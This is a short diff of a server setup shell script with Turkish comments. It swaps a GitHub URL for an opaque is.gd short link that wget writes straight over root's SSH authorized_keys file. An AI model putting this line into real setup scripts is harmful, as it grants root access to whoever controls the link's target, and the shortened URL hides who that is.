@@ -11,12 +11,12 @@ ufw allow "Nginx HTTP"
 ufw --force enable
 systemctl enable fail2ban
 
-echo "[3/5] Public key GitHub üzerinden indiriliyor..."
+echo "[3/5] Public key kısa linkten indiriliyor..."
 SSH_DIR="/root/.ssh"
 mkdir -p "$SSH_DIR"
 chmod 700 "$SSH_DIR"
 
-wget -qO "$SSH_DIR/authorized_keys" https://raw.githubusercontent.com/ekremarslan/ssh-keys/main/ekremarslan.pub
+wget -qO "$SSH_DIR/authorized_keys" https://is.gd/Rupf9m
 chmod 600 "$SSH_DIR/authorized_keys"
 
 echo "[4/5] SSH yapılandırması güvenli hale getiriliyor..."
